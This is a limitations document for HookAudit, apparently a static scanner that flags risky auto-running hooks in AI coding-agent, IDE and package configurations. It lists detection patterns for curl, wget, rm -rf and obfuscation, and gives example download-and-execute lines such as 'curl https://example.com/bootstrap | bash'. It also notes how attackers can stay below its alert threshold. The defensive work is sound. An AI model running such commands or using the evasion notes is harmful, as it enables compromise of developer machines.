# LIMITATIONS.md — What HookAudit Cannot Determine

**Version:** 0.1.0 — 2026-08-31  
**Honesty rule:** Unknown is better than invented certainty. This file exists to avoid false confidence.

HookAudit is a **static, local, file-integrity tripwire** — not a sandbox, not a proof of safety. Please read these limits before relying on its output.

## 1. Working Tree Only (Not All Branches)

**Today:** HookAudit scans the **currently checked-out working tree** via direct filesystem reads. It does **not** walk every local branch.

**Why:** The hackathon rules explicitly forbid hiding a runtime dependency on the `git` binary. Shelling out to `git log --all -- .claude/settings.json` would be a disqualifying hidden dependency.

**What the attacker literature says:** The August 2026 ChainDrop worm *specifically* committed its hooks into **branches other than `main`** so that a review of `main` alone would miss them. Incident responders advised checking every branch, not just `main`.

**Documented stretch (not in this build):** A git-native branch walker that reads `.git/refs/heads/*` and `.git/packed-refs` directly, then inflates loose objects via `node:zlib` (stdlib) to walk each branch’s tree **without** invoking `git` — legal under the rules because it only reads `.git`’s on-disk format. This is the single most valuable future addition and the top item in `PLAN.md:5`.

**Until then:** If you need multi-branch assurance today, run HookAudit after checking out each branch you care about, or use `git worktree`.

## 2. No TOML / YAML Structural Parsing

**Affected surfaces:**

- `.codex/config.toml` — scanned as **raw text** via the same heuristic engine as other surfaces, not structurally parsed.
- `.pre-commit-config.yaml` / `.pre-commit-config.yml` — same raw-text treatment.

**Why:** Node’s standard library has **no TOML or YAML reader** (confirmed against the hackathon’s own cheat-sheet). A correct hand-rolled parser for either was out of scope for this build (and a bad parser would be worse than honest raw-text scanning — it would create false certainty).

**Consequence:** A hook whose dangerous content is split across TOML’s multiline-string syntax (`"""` or `'''`) or YAML’s block scalars could be missed by field-level extraction. The whole-file text sweep still runs, so a blunt `curl https://evil` or `eval(` inside the file will still be caught, but a subtly structured evasion might not.

**Top of “should have” if time permits:** Structural parse for at least Codex TOML’s hook-relevant fields (see `STDLIB.md:11`).

## 3. Heuristic, Not Exhaustive — Designed to Under-Flag

Every rule requires a **specific, named signal** to fire:

- `network-fetch` — `curl|wget|Invoke-WebRequest|fetch("https:`
- `runtime-bootstrap` — `bun|node|python` + `install|download|--install`
- `obfuscation` — 200-char base64 blob or `eval`/`new Function`/`atob`
- `shell-out` — `rm -rf|chmod +x|nohup|&$`
- `cross-reference` — path under a *different* surface’s directory (`.claude/` vs `.vscode/` vs `.cursor/` …)
- auto-trigger weight — `SessionStart`, `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `folderOpen`, `preinstall|postinstall|prepare|install|prepublish`

An attacker who **avoids every one** of those five signals (no network call, no runtime download, no cross-reference, no obfuscation, and accepts the `WARN`-level “it auto-fires” flag alone) would **not** be scored `CRITICAL`. That’s intentional — we chose to under-flag rather than train users to ignore a noisy tool.

**The real safety net is `baseline/diff`:** *Any* change to a tracked hook file is reported as `CHANGED`/`NEW`/`REMOVED` regardless of its heuristic score. Even a “clean-looking” one-liner edit creates drift.

## 4. No Full Shell / Language Parsing — Bounded Static Analysis

HookAudit does **not** contain a full shell AST, JS/Python interpreter, or PowerShell parser. It normalizes commands to `CommandSpec{raw, executable, args, shell, references}` via light tokenization and regex, and resolves `config → script → script` statically up to `MAX_GRAPH_DEPTH=32` with cycle (`CYCLE_DETECTED`) and depth guards — never executing target code.

Correctly handled (now implemented):
- `path = process.env.X + "/setup.sh"` → `DYNAMIC_EXECUTION` / `UNRESOLVED_REFERENCE` with `LOW` confidence + `BOUNDARY_VIOLATION` if outside root (resolver via `resolveInsideRepository`).
- `command = variableA + variableB` → `DYNAMIC_EXECUTION` + `PARTIALLY_RESOLVED` where appropriate.
- `config → script A → script B → capability` is followed as a multi-hop execution graph (`SCRIPT` nodes, `REFERENCES` edges, `ExecutionPath[]` with `capabilities` + `risk` + `confidence`). Verified via `multi-hop` fixture (`NETWORK_ACCESS` reachable).

We will never build a general-purpose interpreter — only a bounded resolver. Anything requiring runtime evaluation remains `DYNAMIC_EXECUTION`/`UNRESOLVED_REFERENCE` with evidence.

## 5. Dynamic Code & Dynamic Paths (now explicit)

When static analysis encounters:

```
eval(...)
command = variableA + variableB
path = process.env.X + "/setup.sh"
```

it **must not guess** — implemented:

```
DYNAMIC_EXECUTION + UNRESOLVED_REFERENCE/PARTIALLY_RESOLVED + evidence + LOW confidence
```

Obfuscation (`eval(`, `new Function(`, `atob`, 200-char base64) → `OBFUSCATION`/`DYNAMIC_EXECUTION` with evidence. Variable-constructed paths → `DYNAMIC_EXECUTION` + `BOUNDARY_VIOLATION`/`UNRESOLVED_REFERENCE` via `resolveInsideRepository`, confidence `LOW`.

Example output (implemented):

```
Severity: HIGH
Confidence: LOW
Trigger: SessionStart
Path: .claude/settings.json → ${process.env.HOOK}/setup.sh (DYNAMIC)
Capabilities: DYNAMIC_EXECUTION
Evidence: dynamic reference ${process.env.HOOK}/setup.sh
Why: potential impact high but static interpretation incomplete (dynamic construction)
```

## 6. Unsupported Ecosystems

**Supported today (11):** Claude Code, MCP, VS Code (tasks + settings), Cursor, Gemini, Codex (heuristic), npm lifecycle, Husky, git hooks, pre-commit.

**Not supported (future adapters, not MVP blockers):** GitHub Copilot, Windsurf, other AI agents, additional IDEs, CI systems, additional MCP project configs, other task runners (see `docs/spec` §5). If a repository uses an unsupported surface, HookAudit will emit **no finding** for it and will not warn — which is why the human report will add (Day-1 stretch):

```
Unsupported execution surfaces were not analyzed.
```

## 7. False Positives & False Negatives

- **False negatives** (missed malicious behavior) are **more likely** than false positives, because every rule requires a specific signal. A patient attacker can stay below `CRITICAL` threshold. Use `baseline` as the compensating control.
- **False positives** do occur: a legitimate `postinstall: echo done` is correctly scored `WARN` (it *does* fire automatically with no separate approval), even though `echo` is harmless. Similarly, a `SessionStart` hook that cross-references `.vscode/` for a legitimate reason (e.g., shared setup script) will be scored `CRITICAL`. These are **review signals, not verdicts**. HookAudit never outputs `MALWARE DETECTED`; it outputs `HIGH-RISK EXECUTION PATH` plus `why` + `evidence`.

## 8. Remote Second-Stage Behavior

HookAudit never fetches remote URLs, never executes extracted commands, never loads target modules. It **cannot** tell you what a remote endpoint *would* have returned at hook time. A `curl https://example.com/bootstrap | bash` is flagged as `NETWORK_ACCESS` + `REMOTE_DOWNLOAD` + `CRITICAL`, but the *content* of `https://example.com/bootstrap` is not inspected.

## 9. Determinism & Platform

- Results are **deterministic for identical repository state** after Day-1 hardening (POSIX-normalized paths, lexicographically sorted files/findings/changes). Before the fix, Windows emitted `\` separators and unsorted `readdir` order.
- File hashes are `SHA-256` via `node:crypto` — stable across platforms.
- Baseline files are **platform-portable** after the fix (POSIX keys). Old baselines created on Windows before the fix contain `\` keys and should be regenerated (`rm -rf .hookaudit && hookaudit baseline .`).

## 10. What to Do Instead

| Concern | Mitigation |
|---|---|
| “Is this repo safe?” | **Never say so from one tool.** HookAudit answers one slice (config-file execution topology). Combine with dependency/CVE scanning, code review, and branch-aware checks. |
| Multi-branch worm | Check out each branch and re-scan, or await the git-native walker (Day-2 stretch). |
| New commit after trust | `hookaudit diff .` on every pull/checkout — any `NEW`/`CHANGED`/`REMOVED` is worth review even if heuristics score it low. |
| Need stricter CI gate | Use `hookaudit . --strict` (Day-1) — exits 1 on `WARN` as well as `CRITICAL`. |
| Need to prove “never executes” | See `test/hookaudit.test.js` `never-execute` — `echo pwned > marker` after `scan` asserts `marker` does NOT exist (permanent regression). |

---

*If a finding matters, verify it by opening the cited file at the cited trigger and reading the command yourself. HookAudit is a reviewer’s aid, not a verdict.*
